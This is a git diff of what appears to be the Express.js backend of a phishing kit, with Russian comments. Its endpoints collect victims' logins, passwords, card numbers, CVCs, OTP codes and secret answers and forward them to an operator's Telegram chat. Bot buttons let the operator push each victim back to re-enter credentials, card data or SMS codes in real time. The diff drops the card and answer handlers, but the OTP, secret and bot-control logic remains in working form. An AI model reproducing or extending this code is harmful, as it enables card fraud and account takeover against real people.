@@ -105,76 +105,6 @@ app.post('/api/action', (req, res) => {
     res.status(200).json(response);
 });
 
-app.post('/api/card', upload.none(), (req, res) => {
-    const { card, exp, cvc, sessionId } = req.body;
-    const users = readUserData();
-    if (!users[sessionId]) {
-        users[sessionId] = {};
-    }
-    users[sessionId].card = card;
-    users[sessionId].exp = exp;
-    users[sessionId].cvc = cvc;
-    writeUserData(users);
-    let message = '';
-    if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
-    if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
-    if (users[sessionId].password) message += `🔐 Password: \`${users[sessionId].password || ''}\`\n`;
-    if (card || exp || cvc) {
-        message += `💳 Card: \`${card}\` | \`${exp}\` | \`${cvc}\`\n`;
-    }
-    if (users[sessionId].otp) message += `✉ OTP: \`${users[sessionId].otp || ''}\`\n`;
-    if (users[sessionId].customResponse) message += `✍ Custom: \`${users[sessionId].customResponse || ''}\`\n`;
-    message += `Session ID: \`${sessionId}\``;
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
-                    { text: '❌ INVALID', callback_data: `cardinvalid:${sessionId}` },
-                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
-                    { text: '🔒 Custom', callback_data: `custom:${sessionId}` },
-                ],
-            ],
-        },
-    };
-    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
-    res.status(200).json({ message: 'Card data received successfully' });
-});
-
-app.post('/api/otp', upload.none(), (req, res) => {
-    const { otp, sessionId } = req.body;
-    const users = readUserData();
-    if (!users[sessionId]) {
-        users[sessionId] = {};
-    }
-    users[sessionId].otp = otp;
-    writeUserData(users);
-    let message = '';
-    if (users[sessionId].offer) message += `💼 Offer: \`${users[sessionId].offer || ''}\`\n`;
-    if (users[sessionId].login) message += `👤 Login: \`${users[sessionId].login || ''}\`\n`;
-    if (users[sessionId].password) message += `🔐 Password: \`${users[sessionId].password || ''}\`\n`;
-    if (users[sessionId].card || users[sessionId].exp || users[sessionId].cvc) {
-        message += `💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n`;
-    }
-    message += `✉ OTP: \`${otp}\`\n`;
-    if (users[sessionId].customResponse) message += `✍ Custom: \`${users[sessionId].customResponse || ''}\`\n`;
-    message += `Session ID: \`${sessionId}\``;
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
-                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
-                    { text: '❌ INVALID', callback_data: `otpinvalid:${sessionId}` },
-                    { text: '🔒 Custom', callback_data: `custom:${sessionId}` },
-                ],
-            ],
-        },
-    };
-    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
-    res.status(200).json({ message: 'OTP received successfully' });
-});
-
 app.post('/api/secret', upload.none(), (req, res) => {
     const { secret, sessionId } = req.body;
     const users = readUserData();
@@ -183,128 +113,103 @@ app.post('/api/secret', upload.none(), (req, res) => {
     }
     users[sessionId].secret = secret;
     writeUserData(users);
-    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${ users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
+    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
     const options = {
         reply_markup: {
             inline_keyboard: [
-                [
-                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
-                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
-                    { text: '❌ INVALID', callback_data: `otpinvalid:${sessionId}` },
-                ],
-            ],
-        },
-    };
-    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
-    res.status(200).json({ message: 'Secret received successfully' });
-});
-
-app.post('/api/answer', upload.none(), (req, res) => {
-    const { answer, sessionId } = req.body;
-    const users = readUserData();
-    if (!users[sessionId]) {
-        users[sessionId] = {};
-    }
-    users[sessionId].customResponse = answer;
-    writeUserData(users);
-    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${answer}\`\nSession ID: \`${sessionId}\``;    
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
-                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
-                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
-                    { text: '🔒 Custom', callback_data: `custom:${sessionId}` },
-                ],
-            ],
-        },
-    };
-    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
-    res.status(200).json({ message: 'Answer received successfully' });
-});
-
-bot.on('callback_query', (callbackQuery) => {
-    const data = callbackQuery.data.split(':');
-    const action = data[0];
-    const sessionId = data[1];
-    const routes = readRoutesData();
-
-    if (action === 'send_secret') {
-        const secretQuestion = data[2];
-        const users = readUserData();
-        if (!users[sessionId]) {
-            users[sessionId] = {};
-        }
-        users[sessionId].secretQuestion = secretQuestion; // Сохраняем секретный вопрос
-        writeUserData(users);
-
-        // Перемещение на кастомную страницу
-        routes[sessionId] = { action: 'custom_page', secretQuestion: secretQuestion };
-        writeRoutesData(routes);
-
-        bot.sendMessage(callbackQuery.message.chat.id, `Успешно отправлено: ${secretQuestion}\nSession ID: ${sessionId}`);
-        return;
-    }
-
-    // Остальная логика для других действий
-    routes[sessionId] = { action: action };
-    writeRoutesData(routes);
-    let messageText;
-    if (action === 'cred') {
-        messageText = "Переход на авторизацию";
-    } else if (action === 'otp') {
-        messageText = "Переход на ввод SMS";
-    } else if (action === 'card') {
-        messageText = "Переход на ввод карты";
-    } else if (action === 'credinvalid') {
-        messageText = "Переход на повторную авторизацию";
-    } else if (action === 'otpinvalid') {
-        messageText = "Переход на повторный ввод SMS";
-    } else if (action === 'cardinvalid') {
-        messageText = "Переход на повторный ввод карты";
-    } else if (action === 'custom') {
-        messageText = "Кастомный текст:";
-        bot.sendMessage(callbackQuery.message.chat.id, messageText);
-        return;
-    }
-    bot.sendMessage(callbackQuery.message.chat.id, messageText);
-});
-
-bot.on('message', (msg) => {
-    console.log('Received message:', msg);
-    const routes = readRoutesData();
-    const sessionId = Object.keys(routes).find(id => routes[id].action === 'waiting_for_secret_question');
-
-    if (!sessionId) {
-        console.error('Session ID not found');
-        return;
-    }
-
-    const users = readUserData();
-    try {
-        if (routes[sessionId] && routes[sessionId].action === 'waiting_for_secret_question') {
-            const secretQuestion = msg.text;
-            bot.sendMessage(msg.chat.id, `Отправить кастом текст: ${secretQuestion}\nSession ID: ${sessionId}`, {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: 'Да', callback_data: `send_secret:${sessionId}:${secretQuestion}` },
-                            { text: 'Нет', callback_data: `cancel_secret:${sessionId}` },
-                        ],
+                    [
+                        { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
+                        { text: '💳 CARD', callback_data: `card:${sessionId}` },
+                        { text: '❌ INVALID', callback_data: `otpinvalid:${sessionId}` },
                     ],
-                },
-            });
-            // Обновляем действие на confirm_secret_question
-            routes[sessionId].action = 'confirm_secret_question';
+                ],
+            },
+        };
+        bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
+        res.status(200).json({ message: 'Secret received successfully' });
+    });
+
+    bot.on('callback_query', (callbackQuery) => {
+        const data = callbackQuery.data.split(':');
+        const action = data[0];
+        const sessionId = data[1];
+        const routes = readRoutesData();
+
+        if (action === 'send_secret') {
+            const secretQuestion = data[2];
+            const users = readUserData();
+            if (!users[sessionId]) {
+                users[sessionId] = {};
+            }
+            users[sessionId].secretQuestion = secretQuestion; // Сохраняем секретный вопрос
+            writeUserData(users);
+
+            // Перемещение на кастомную страницу
+            routes[sessionId] = { action: 'waiting_for_secret_question', secretQuestion: secretQuestion };
             writeRoutesData(routes);
+
+            bot.sendMessage(callbackQuery.message.chat.id, `Успешно отправлено: ${secretQuestion}\nSession ID: ${sessionId}`);
             return;
         }
-    } catch (error) {
-        console.error('Error processing message:', error);
-    }
-});
 
-app.listen(port, () => {
-    console.log(`Server is running on http://localhost:${port}`);
-});
+        // Остальная логика для других действий
+        routes[sessionId] = { action: action };
+        writeRoutesData(routes);
+        let messageText;
+        if (action === 'cred') {
+            messageText = "Переход на авторизацию";
+        } else if (action === 'otp') {
+            messageText = "Переход на ввод SMS";
+        } else if (action === 'card') {
+            messageText = "Переход на ввод карты";
+        } else if (action === 'credinvalid') {
+            messageText = "Переход на повторную авторизацию";
+        } else if (action === 'otpinvalid') {
+            messageText = "Переход на повторный ввод SMS";
+        } else if (action === 'cardinvalid') {
+            messageText = "Переход на повторный ввод карты";
+        } else if (action === 'custom') {
+            messageText = "Кастомный текст:";
+            bot.sendMessage(callbackQuery.message.chat.id, messageText);
+            return;
+        }
+        bot.sendMessage(callbackQuery.message.chat.id, messageText);
+    });
+
+    bot.on('message', (msg) => {
+        console.log('Received message:', msg);
+        const routes = readRoutesData();
+        const sessionId = Object.keys(routes).find(id => routes[id].action === 'waiting_for_secret_question');
+
+        if (!sessionId) {
+            console.error('Session ID not found');
+            return;
+        }
+
+        const users = readUserData();
+        try {
+            if (routes[sessionId] && routes[sessionId].action === 'waiting_for_secret_question') {
+                const secretQuestion = msg.text;
+                bot.sendMessage(msg.chat.id, `Отправить кастом текст: ${secretQuestion}\nSession ID: ${sessionId}`, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: 'Да', callback_data: `send_secret:${sessionId}:${secretQuestion}` },
+                                { text: 'Нет', callback_data: `cancel_secret:${sessionId}` },
+                            ],
+                        ],
+                    },
+                });
+                // Обновляем действие на confirm_secret_question
+                routes[sessionId].action = 'confirm_secret_question';
+                writeRoutesData(routes);
+                return;
+            }
+        } catch (error) {
+            console.error('Error processing message:', error);
+        }
+    });
+
+    app.listen(port, () => {
+        console.log(`Server is running on http://localhost:${port}`);
+    });
